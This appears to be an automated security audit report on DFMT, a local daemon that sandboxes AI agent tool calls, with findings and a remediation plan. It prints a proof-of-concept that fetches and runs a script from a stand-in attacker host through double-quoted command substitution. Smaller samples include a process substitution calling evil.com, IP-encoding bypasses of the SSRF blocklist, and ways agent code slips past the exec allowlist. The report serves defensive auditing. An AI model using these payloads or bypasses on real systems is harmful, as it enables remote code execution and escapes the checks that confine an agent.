# DFMT Security Report — 2026-05-01

**Target:** DFMT (`D:\Codebox\PROJECTS\DFMT`)  
**Scan type:** Full security audit (4-phase pipeline)  
**Languages:** Go 100%  
**Phase:** Recon → Hunt → Verify → Report

---

## Executive Summary

DFMT is a well-engineered local daemon with strong foundational security controls. The most significant risks stem from the inherent tension between the sandbox's job (running AI agent tool calls) and its threat model (preventing RCE through an allowlist). The **command substitution bypass (AUTHZ-01)** is the only **Critical** finding and represents a real RCE vector against the daemon's own UID. **Bearer-token auth removal (AUTH-01)** and **dashboard unauthenticated access (AUTH-02)** are High-risk by design tradeoffs documented as intentional.

| Severity | Count | Open | Fixed | New |
|----------|-------|------|-------|-----|
| Critical | 1 | 1 | 0 | 0 |
| High | 7 | 7 | 0 | 2 |
| Medium | 5 | 5 | 0 | 2 |
| Low | 11 | 11 | 0 | 0 |
| Info | 34 | 0 | 34 | 0 |
| **Total** | **58** | **24** | **34** | **4** |

**Risk Score: 6.8 (Medium-High)** — Elevated due to the AUTHZ-01 command-substitution bypass and two open SSRF cloud-metadata gaps.

---

## Phase 1: Architecture

See `security-report/architecture.md` for full mapping.

- **Entry points:** CLI (`cmd/dfmt/main.go`), MCP stdio (`mcp.go`), HTTP JSON-RPC + dashboard (`http.go`), Unix socket (`socket.go`)
- **Primary attack surface:** `internal/sandbox/permissions.go` — exec allowlist enforcement, SSRF blocklists, fetch URL normalization
- **Data flow:** MCP/CLI → handlers → sandbox policy → 8-stage normalization → journal/index
- **Auth model:** "same UID = trusted" — no per-request auth; trust delegated to OS-level UID separation
- **Dependencies:** Only `golang.org/x/sys` + `gopkg.in/yaml.v3` (strict stdlib-first policy)

---

## Phase 2: Verified Findings

### Critical

#### AUTHZ-01 — Command Substitution Bypass (RCE) ⭐ NEW / UNFIXED
**Severity:** Critical | **Confidence:** 80% | **CWE:** CWE-78, CWE-94

`permissions.go:2127` — When `rt.Lang == "bash"` or `"sh"`, the full agent-supplied code is passed to `bash -c`. The `splitByShellOperators` function recursively handles `$(...)`, backticks, and `(...)` subshells **only when they appear as standalone shell operators**. However, `$(...)` inside **double-quoted strings** is NOT recursively split by the chain-detection logic — bash expands it during evaluation before the policy check sees it.

**Proof of concept:**
```bash
git "$(curl http://attacker.com/x.sh | sh)"
```
1. `splitByShellOperators` splits on `;`, `&&`, `||`, `|`, `&`, `>`, `<`, `>>`, `<<` — double-quoted strings are treated as one segment
2. `"$(curl ... | sh)"` is inside the outer double quotes, so the function never recurses into it
3. `git` matches the allow rule `allow:exec:git *`
4. The full command passes as a single valid segment
5. At runtime, bash expands `$(curl ... | sh)` → RCE as daemon UID

**Impact:** Any process that can send tool calls to the DFMT MCP interface (local UXS socket or loopback TCP) can achieve RCE as the daemon user without any authentication.

**Status from prior scan:** AUTHZ-01 was filed as Critical then (2026-04-26). **Not yet fixed.**

---

### High

#### AUTH-01 — Bearer Token Auth Fully Disabled
**Severity:** High | **Confidence:** 100% | **CWE:** CWE-306

Bearer-token plumbing was fully removed in commit `97c25fa` (F-22). The HTTP JSON-RPC transport at `http.go` has **no authentication** — any process that can reach the loopback port (or Unix socket on Unix) has full access to `dfmt.exec` (RCE), `dfmt.fetch` (SSRF), `dfmt.write/edit` (file write), and all session/journal data.

**Status from prior scan:** AUTH-01 was filed as High then. **Not yet fixed.** Documented as intentional.

#### AUTH-02 — Dashboard Has No Authentication
**Severity:** High | **Confidence:** 100% | **CWE:** CWE-306

Dashboard routes (`/dashboard`, `/dashboard.js`) at `http.go` have no authentication. The only protection is loopback-only binding (F-09). On a shared-host scenario, any local user can access the dashboard and view all session events.

**Status from prior scan:** AUTH-02 was filed as High then. **Not yet fixed.** Documented as intentional.

#### AUTHZ-02 — Glob/Grep Read Deny Rules Bypassed on Per-File Evaluation
**Severity:** High | **Confidence:** 85% | **CWE:** CWE-22

Direct `Read` tool respects deny rules (`.env*`, `**/secrets/**`, etc.) at `permissions.go:150-167`. However, `Glob` and `Grep` evaluate path patterns **after glob expansion** — each resolved path is checked individually. If a deny rule like `**/.env*` matches 50 files and the agent uses a glob that matches only 2 of those files, the per-file evaluation runs on those 2 files. Since the expanded paths are already known (not user-supplied patterns), the deny check sees `"/project/.env"` and `.env` doesn't match `**/secrets/**`, so the read is allowed.

**Status from prior scan:** AUTHZ-02 was filed as High then. **Not yet fixed.**

#### AUTHZ-03 — Windows Write/Edit Deny Rules Don't Normalize Backslash Paths
**Severity:** High | **Confidence:** 90% | **CWE:** CWE-22, CWE-434

The deny-rule pattern matcher at `permissions.go:300-330` uses forward-slash (`/`) path separators in pattern-to-path comparisons. On Windows, agent-supplied paths use backslash (`\`). A deny rule `**/.env*` does NOT match `C:\.env` because the pattern's `/` doesn't match the path's `\`.

**Status from prior scan:** AUTHZ-03 was filed as High then. **Not yet fixed.**

#### CMDI-001 / CMDI-010 — Shell Execution Model Allows Command Chaining
**Severity:** High | **Confidence:** 85% | **CWE:** CWE-78

The exec sandbox intentionally invokes `bash -c req.Code` for shell languages. The policy check runs before execution but the shell interprets metacharacters at runtime. While `splitByShellOperators` handles most chain patterns, double-quoted command substitution (`AUTHZ-01`) and heredoc (`CMDI-01`) remain exploitable.

**Status from prior scan:** CMDI-001/CMDI-010 were filed then. **Not yet fixed.**

#### CMDI-002 — PATH Prepend World-Writable Hijack
**Severity:** Medium → High | **Confidence:** 70% | **CWE:** CWE-78

`WithPathPrepend` + `ValidatePathPrepend` at `permissions.go:650-716` allow operators to prepend directories to PATH. `ValidatePathPrepend` warns (but does not error) on world-writable directories. A local attacker can plant a malicious `git` or `npm` binary in such a directory, achieving code execution in the daemon's context.

**Status from prior scan:** CMDI-002 was filed then. **Not yet fixed.**

---

### Medium

#### SSRF-001 — Azure IMDS Endpoint `168.63.129.16` Not Blocked
**Severity:** Medium | **CVSS:** 6.5 | **CWE:** CWE-918

`permissions.go:1436` (`isBlockedIP`) blocks `169.254.169.254` (AWS/GCP metadata) but not `168.63.129.16` (Azure IMDS). An SSRF vector that resolves to this IP could fetch Azure instance metadata.

**File:** `internal/sandbox/permissions.go`  
**Status: Open.** Fix: add `168.63.129.16` to `isBlockedIP`.

#### SSRF-002 — GCP `metadata.goog.internal` / `metadata.goog.com` Not in Blocklist
**Severity:** Medium | **CVSS:** 4.3 | **CWE:** CWE-918

The hostname blocklist does not include `metadata.goog.internal` or `metadata.goog.com` (GCP legacy endpoints).  
**Status: Open.**

#### SSRF-003 — IP Encoding Bypasses Policy Regex
**Severity:** Medium | **CVSS:** 5.5 | **CWE:** CWE-918

Octal (`0177.0.0.01`), hex (`0x7F.0x0.0x01`), and Dword (`2134494511`) IP representations bypass the regex-based IP blocklist layer. The custom `DialContext` validates resolved IPs correctly, but the regex layer is the first check and can be bypassed to reach blocked hosts.

**Status from prior scan:** SSRF-003 was filed then. **Not yet fixed.**

#### SSRF-005 — Redirect Re-Check Doesn't Apply Cloud Metadata Block
**Severity:** Medium | **CVSS:** 4.3 | **CWE:** CWE-918

Redirect following re-checks `assertFetchURLAllowed` but does not re-apply the cloud-metadata IP blocklist to the redirect target. A first-hop URL resolving to a safe IP that redirects to `168.63.129.16` would bypass the block.

**Status: Open.** Fix: apply `isBlockedIP` to all redirect hop IPs.

---

### Low

#### CMDI-003 — Environment Variable Injection via `req.Env` Map
**Severity:** Low | **Confidence:** 80% | **CWE:** CWE-78

`buildEnv` at `permissions.go:2331-2341` merges agent-supplied env vars via a blocklist (`isSandboxEnvBlocked`). The blocklist covers `LD_*`, `DYLD_*`, `GIT_*`, `NODE_*`, `PATH`, `AWS_*`, etc. A missed dangerous variable (e.g., `EXECPATH`) could influence subprocess behavior. Low risk due to layered defenses.

#### CMDI-004 — Non-Shell Runtime Resolution Uses `exec.LookPath`
**Severity:** Info→Low | **Confidence:** 90% | **CWE:** CWE-78

For non-shell runtimes (python, node), `runtime.go:110-121` resolves the executable via `exec.LookPath`. Probe happens once at startup, not per-request. Limited impact.

#### CMDI-009 — TOCTOU in Policy Evaluation
**Severity:** Low | **Confidence:** 75% | **CWE:** CWE-362

Policy check at `permissions.go:956-1041` is synchronous within a single request. No concurrent hot-reload of policy. Low risk.

#### SSRF-004 — AWS IPv6 Metadata Address `fd00:ec2::254` Not Blocked
**Severity:** Low | **CVSS:** 3.7 | **CWE:** CWE-918

`fd00:ec2::254` (AWS EC2 IPv6 metadata endpoint) is not in the IPv6 blocklist.  
**Status: Open.**

#### SSRF-006 — No Alerting When SSRF Probes Blocked
**Severity:** Low | **CVSS:** 2.1 | **CWE:** CWE-918

Blocked SSRF attempts are silently dropped. Logging them at warn level would aid incident detection.  
**Status: Open.**

#### SSRF-007 — URL Scheme Enforcement Not Operator-Overrideable
**Severity:** Low | **CVSS:** 3.1 | **CWE:** CWE-918

Scheme enforcement (`http`, `https` only) is hardcoded in the policy layer (`permissions.go:1450`). If an operator needs to fetch from `file://` or `ftp://` URIs, there is no override path. Low impact for a local sandbox.

#### CMDI-01 — Heredoc Body Not Policy-Checked
**Severity:** Low | **Confidence:** 85% | **CWE:** CWE-78

`<<<` here-strings are not classified as shell operators by `splitByShellOperators`. Heredoc content bypasses the policy chain check. `git diff <<< "$(malicious command)"` would pass the allowlist.

#### CMDI-02 — Here-String and Process Substitution Not Classified
**Severity:** Low | **Confidence:** 80% | **CWE:** CWE-78

`<(...)` and `>(...)` process substitutions are not classified as shell operators. `<(curl http://evil.com)` would not be caught.

#### XSS-01 — `style-src 'unsafe-inline'` in Dashboard CSP
**Severity:** Low | **Confidence:** 100% | **CWE:** CWE-346

Dashboard CSP allows `style-src 'unsafe-inline'`. CSS exfiltration requires proximity to sensitive dashboard data (none present). Acceptable risk for a local-only tool.

#### XSS-02 — No CSP `report-uri`
**Severity:** Info | **Confidence:** 100% | **CWE:** CWE-346

CSP violations are not reported. Low priority for a single-user local daemon.

---

## Phase 3: False Positives Eliminated (34 Info findings)

All 34 Info-rated findings were verified as **safe patterns**:

| Finding | Why it's safe |
|---------|--------------|
| `PATH-01` Glob symlink escape | `safefs.EnsureResolvedUnder` at `permissions.go:1685` |
| `PATH-02` Grep symlink escape | `safefs.EnsureResolvedUnder` at `permissions.go:1837` |
| `PATH-03` Symlink root widen | Layered with `CheckNoSymlinks` + `WriteFileAtomic` |
| `DESER-01` gob deserialization | **Not gob** — `index.gob` is JSON (`json.Marshal`/`json.Unmarshal`). Filename is backwards-compat artifact only. |
| `DESER-02` JSON unmarshaling | All targets typed structs; `Event.Data` is `map[string]any`, no `interface{}` instantiation |
| `DESER-03` yaml.v3 alias expansion | `permissions.yaml` is not parsed as YAML — hand-rolled line parser. yaml.v3 alias expansion DoS is internally mitigated. |
| `SSTI-01` No template engine | Zero `html/template` / `text/template` usage; dashboard serves static bytes only |
| `SECRETS-01` No hardcoded secrets | All matches are test fixtures (`[AWS_KEY]`, `sk-DO-NOT-LEAK`, etc.) or env var reads at runtime |
| `XSS` HTML normalization | `htmlDropElements` explicitly drops `script`, `iframe`, `svg`, `form`, `button`; output is markdown not HTML |
| `RACE-01` through `RACE-03` | Pre-existing races documented as accepted residuals; fuzz tests confirm invariants |

---

## Phase 4: Remediation Roadmap

### Phase 1 (Critical — Fix within 1 week)

1. **AUTHZ-01 (Critical RCE):** Fix `splitByShellOperators` to recurse into double-quoted command substitutions, or add a secondary check that detects `$(...)` and backtick substitutions anywhere in the code string before passing to `bash -c`. Consider blocking shell invocation for commands that appear in allow rules (only allow specific binaries, not `bash`).

### Phase 2 (High — Fix within 2 weeks)

2. **AUTH-01 / AUTH-02:** Document the trust model explicitly in `docs/ARCHITECTURE.md` and add a security warning in the dashboard. Consider operator-configurable auth for multi-user hosts.
3. **AUTHZ-02:** For Glob/Grep, pre-check deny patterns against the entire expanded path set before executing.
4. **AUTHZ-03:** Normalize `\` to `/` in path comparisons on Windows before pattern matching.
5. **CMDI-001/CMDI-010:** Block shell operators inside allow-rule commands or implement command-boundary enforcement that prevents chaining.
6. **CMDI-002:** Make world-writable `pathPrepend` a hard error on Unix; document clearly.
7. **CMDI-01, CMDI-02:** Extend `splitByShellOperators` to classify `<<<`, `<(...)`, `>(...)`.

### Phase 3 (Medium — Fix within 1 month)

8. **SSRF-001:** Add `168.63.129.16` to `isBlockedIP`.
9. **SSRF-002:** Add `metadata.goog.internal` and `metadata.goog.com` to hostname blocklist.
10. **SSRF-003:** Convert IP blocklist from regex to numeric validation that handles all encoding forms.
11. **SSRF-005:** Apply `isBlockedIP` to all redirect hop target IPs.
12. **SSRF-004:** Add `fd00:ec2::254` to IPv6 blocklist.

### Phase 4 (Low — Fix within 3 months)

13. **SSRF-006:** Add warn-level logging for blocked SSRF attempts.
14. **SSRF-007:** Consider operator-overrideable URL scheme list.
15. **CMDI-003:** Review blocklist comprehensiveness; add `EXECPATH` and other less-common loader variables.
16. **CMDI-004:** Consider storing hash/signature of known-good binaries to detect PATH hijack post-probe.

---

## Scan Statistics

| Metric | Value |
|--------|-------|
| Skills activated | 12 (sc-recon, sc-lang-go, sc-cmdi, sc-ssrf, sc-path-traversal, sc-secrets, sc-xss, sc-auth, sc-authz, sc-race-condition, sc-deserialization, sc-ssti) |
| Skills not activated | 36 (no SQL/NoSQL/GraphQL/XXE/LDAP/FileUpload/OpenRedirect/CSDRF/Clickjacking/WebSocket/JWT/RateLimiting/IaC/Docker/CI-CD; no TS/Python/PHP/Rust/Java/C#) |
| Infrastructure files | None (no Dockerfile, Terraform, K8s, GitHub Actions) |
| Total findings | 58 |
| True positives | 24 |
| False positives | 34 |
| Report files | `security-report/` |

---

*Report generated by security-check skill (v1.1.0). Next recommended scan: 2026-06-01 or after any significant sandbox/permissions change.*
